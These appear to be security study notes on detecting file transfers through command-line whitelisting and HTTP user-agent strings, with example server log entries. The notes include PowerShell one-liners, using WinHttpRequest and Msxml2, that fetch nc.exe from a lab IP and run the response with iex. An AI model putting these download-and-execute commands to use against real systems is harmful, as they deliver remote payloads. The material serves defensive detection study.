- Command-Line detection based on blacklisting is straightforward to bypass.
- The process of Whitelisting all command lines in a particular environment is initially time-consuming.
- Its very robust and allow for quick detection and alerting on any unusual command lines. 
### HTTP protocol & user agents
- When a client (browser, tool or script) connects to a web server, it usually identifies itself with a user agent string.
	- Example;
		- Chrome: `Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/.... Chrome/117.0 Safari/537.36`
		- FireFox: `Mozilla/5.0 (Windows NT 10.0; Win64; rv:118.0) Gecko/20100101 FireFox/118.0`
- ### Why important?
	- Web Servers use this to ensure compatibility 
	- But anything acting as an HTTP client can also set a user agent string, including tools like:
		- cURL
		- python request scripts
		- Pentest/red-team tools
- ### In a **SIEM** (Security Information & Event Management tool):

	- Filter out known-good agents.
	- Flag anomalies (e.g., `sqlmap/1.5.2#stable` or `python-requests/2.31`).
	- Investigate suspicious ones to see if they were used for malicious purposes.

- ## Invoke-WebRequest - Client

	- `Invoke-WebRequest http://<IP>/<file_name> -OutFile "<Destined_file_path>"`
	- `Invoke-RestMethod http://<IP>/<file_name> -OutFile "<Destined_file_path>"`
	
	- ### Invoke - WebRequest - Server:
	
		-   `GET /nc.exe HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0`

- ## WinHttpRequest - Client:
	
	- PoweShell:
		- `$h=new-object -com WinHttp.WinHttpRequest.5.1;`
		- `$h.open('GET','http://10.10.10.32/nc.exe',$false);`
		- `$h.send();`
		- `iex $h.ResponseText`
		
			- ### WinHttpRequest - Server
				`GET /nc.exe HTTP/1.1`
				`Connection: Keep-Alive`
				`Accept: */*`
				`User-Agent: Mozilla/4.0(compatible;Win32;WinHttp.WinHttpRequest.5)`

- ## Msxml2 - Client:

	- PowerShell:
		- `$h=New-Object -ComObject Msxml2.XMLHTTP;`
		- `$h.open('GET','http://10.10.10.32/nc.exe',$false);`
		- `$h.send();`
		- `iex $h.responseText`
### and so on
This [website](http://useragentstring.com/index.php) is handy for identifying common user agent strings. A list of user agent strings is available [here](http://useragentstring.com/pages/useragentstring.php).